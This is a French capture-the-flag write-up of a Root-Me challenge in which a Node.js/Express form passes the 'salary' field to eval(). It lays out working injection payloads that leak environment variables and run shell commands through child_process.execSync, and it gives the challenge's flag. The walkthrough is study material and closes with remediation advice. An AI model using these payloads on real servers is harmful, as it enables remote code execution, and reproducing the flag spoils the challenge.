# Root-Me — Web Serveur ch39 — Node.js eval() / RCE

## Résumé
Un formulaire de calcul de « reste à vivre » (Express / Node.js) évalue les
champs saisis via `eval()` côté serveur. Le champ `salary` étant injecté
directement dans l'expression évaluée, on obtient une exécution de code
JavaScript arbitraire, puis une exécution de commandes système (RCE) et la
lecture du flag.

**Flag :** `D0n0tTru5tEv0d3B4nK!`

## Cible
- `POST http://challenge01.root-me.org:59039/`
- Stack : `X-Powered-By: Express` (Node.js)
- Process : `web-serveur-ch39`, `PWD=/challenge/web-serveur/ch39`

## Démarche

### 1. Détection de l'injection
Le champ `salary` est renvoyé brut dans « Salary », mais calculé dans
« Remainder ». Une valeur non numérique révèle l'évaluation côté serveur :

| Entrée (`salary=`) | « Remainder » | Conclusion |
|---|---|---|
| `a2000` | `ReferenceError: a2000 is not defined` | chaîne évaluée comme du JS |
| `2*1000` | `1965` | arithmétique évaluée (`2000 - 2-3-4-5-6-7-8`) |

La formule du serveur est donc :
`salary - housing - phone - transport - insurance - credits - taxes - hobbies`

### 2. Confirmation d'un vrai `eval()` (et non d'un parseur mathématique)
| Entrée | « Remainder » | Conclusion |
|---|---|---|
| `({}).constructor` | `NaN` | objet − nombre = `NaN` → JS réel |
| `process` / `global` | `NaN` | objets Node accessibles dans la portée |

### 3. Obstacle : lecture de la sortie
Le résultat est inséré dans `value="..."` et subit l'arithmétique
(` - housing - ...`), donc toute chaîne devient `NaN`. Les tentatives de
neutraliser la fin de l'expression échouent :
- `//` → ne commente rien (champ pas en fin de ligne)
- `/*` → `SyntaxError` (bloc jamais fermé)

### 4. Contournement : l'objet `res` est dans la portée
`res` (réponse Express) est accessible depuis l'`eval`. `res.send(...)`
reprend le contrôle total de la réponse HTTP et élimine le problème
d'affichage.

Fuite des variables d'environnement :
```
salary=res.send(process.env)
```
→ confirme l'accès à `process`, le user `web-serveur-ch39` et le répertoire
du challenge.

### 5. RCE et lecture du flag
```
salary=res.send(process.mainModule.require('child_process').execSync('ls -la /challenge/web-serveur/ch39').toString())
```
Puis lecture du flag (espaces encodés en `+` dans le corps urlencoded) :
```
salary=res.send(process.mainModule.require('child_process').execSync('cat /challenge/web-serveur/ch39/S3cr3tEv0d3f0ld3r/Ev0d3fl4g').toString())
```
→ `D0n0tTru5tEv0d3B4nK!`

## Payload final
```
salary=res.send(process.mainModule.require('child_process').execSync('cat /challenge/web-serveur/ch39/S3cr3tEv0d3f0ld3r/Ev0d3fl4g').toString())
```

## Cause racine
Évaluation d'une entrée utilisateur non assainie via `eval()`. `eval` exécute
du JavaScript arbitraire avec accès à `process` / `require`, menant à la RCE.

## Remédiation
- Ne jamais passer d'entrée utilisateur à `eval()` / `new Function()`.
- Pour évaluer des expressions mathématiques, utiliser un parseur dédié et
  restreint (ex. `mathjs` en mode limité) ou implémenter un calcul manuel
  après validation stricte (n'accepter que des nombres).
- Valider/typer chaque champ en amont (p. ex. `parseFloat` + contrôle `NaN`).
- Appliquer le principe du moindre privilège au process Node.
